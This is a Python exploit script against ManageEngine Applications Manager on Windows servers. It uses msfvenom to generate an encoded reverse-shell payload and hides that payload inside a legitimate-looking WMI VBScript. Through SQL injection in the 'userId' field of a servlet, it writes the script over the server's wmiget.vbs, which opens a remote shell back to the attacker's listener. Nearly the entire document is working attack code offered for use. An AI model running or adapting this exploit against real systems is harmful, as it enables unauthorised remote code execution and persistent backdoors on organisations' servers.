#!/usr/bin/env python3

import subprocess
import argparse
import traceback
import sys
import base64
import urllib
import requests
import urllib3
from requests.packages import urllib3  
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

"""
This exploit will only work on Windows servers

Example usage:
/usr/bin/python3 windows_rce.py <Listener_IP> <Listener_PORT>
"""


def generate_reverse_shell(lhost, lport):
    print("[*] Generating the backdoor using msfvenom...")
    command = [
        "msfvenom",
        "-a", "x86",
        "--platform", "windows",
        "-p", "windows/shell_reverse_tcp",
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-e", "x86/shikata_ga_nai",
        "-f", "vbs",
        "-o", "revShell.vbs"
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("[+] Shellcode created successfully.")
        if result.stderr:
            print("Warnings:\n", result.stderr)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[!] msfvenom failed (code {e.returncode}): {e.stderr.strip()}")
    except FileNotFoundError:
        print("[!] msfvenom not found. Is Metasploit installed?")
    except Exception as e:
        print(f"[!] Unexpected error during msfvenom: {e}")
        traceback.print_exc()
    return False


def modify_payload():
    print("[*] Cleaning the msfvenom payload...")
    try:
        command = [
            "perl", "-0777", "-pe",
            r"s/ _.*?\n//g; s/\t//g; s/\n/:/g; for (1..4) { s/::+/:/g }",
            "revShell.vbs"
        ]
        result = subprocess.run(command, capture_output=True, text=True, check=True)

        with open("cleaned.vbs", "w") as f:
            f.write(result.stdout)

        print("[+] Payload cleaned successfully.")

        print("[*] Removing all newlines to create single_line.vbs...")
        tr_command = "tr -d '\\n' < cleaned.vbs > single_line.vbs"
        subprocess.run(tr_command, shell=True, check=True)
        print("[+] single_line.vbs created.")
        return True

    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"[!] Error cleaning payload: {e}")
        traceback.print_exc()
    except Exception as e:
        print("[!] Unexpected error during payload cleaning:")
        traceback.print_exc()
    return False


def create_vbs():
    try:
        with open("single_line.vbs", "r") as f:
            backdoor = f.read().replace('\n', '')
            full_vbs = rf""":On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")::if Err.Number Then:WScript.Echo vbCrLf & "Error # " &             " " & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2")::      ::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2",strUsername,strPassword)::       case 6:               strComputer = Wscript.Arguments(0):       strUsername = Wscript.Arguments(1):        strPassword = Wscript.Arguments(2):       strQuery = Wscript.Arguments(4):       namespace = Wscript.Arguments(5):       :       Set wbemServices = objWbemLocator.ConnectServer      (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = "":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:{backdoor}:WScript.Quit(0):"""
            encoded = base64.b64encode(full_vbs.encode("utf-8")).decode("utf-8")
            return encoded
    except Exception as e:
        print("[!] Error encoding the VBS payload:")
        traceback.print_exc()
        return None


def send_backdoor(encoded_payload):
    print("[*] Sending the backdoor payload...")
    url = "https://manageengine:8443/servlet/AMUserResourcesSyncServlet"
    cookies = {
        "JSESSIONID_APM_9090": "D3E78012D7AF2DE8BD77B49782B894E5",
        "testcookie": "", "am_username": "", "am_check": ""
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "ForMasRange": "1",
        "userId": f"1;copy (select convert_from(decode($${encoded_payload}$$,$$base64$$),$$utf-8$$)) to $$C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\conf\\\\\\\\application\\\\scripts\\\\wmiget.vbs$$;"
    }
    try:
        response = requests.post(url, headers=headers, cookies=cookies, data=data, verify=False)
        print("[+] Payload sent. HTTP Status:", response.status_code)
    except Exception as e:
        print("[!] Failed to send backdoor:")
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="Inject a VBS backdoor into the target Windows system")
    parser.add_argument("lhost", help="Attacker's machine IP")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()

    if not generate_reverse_shell(args.lhost, args.lport):
        return

    if not modify_payload():
        return

    encoded_payload = create_vbs()
    if not encoded_payload:
        return

    send_backdoor(encoded_payload)


if __name__ == "__main__":
    main()
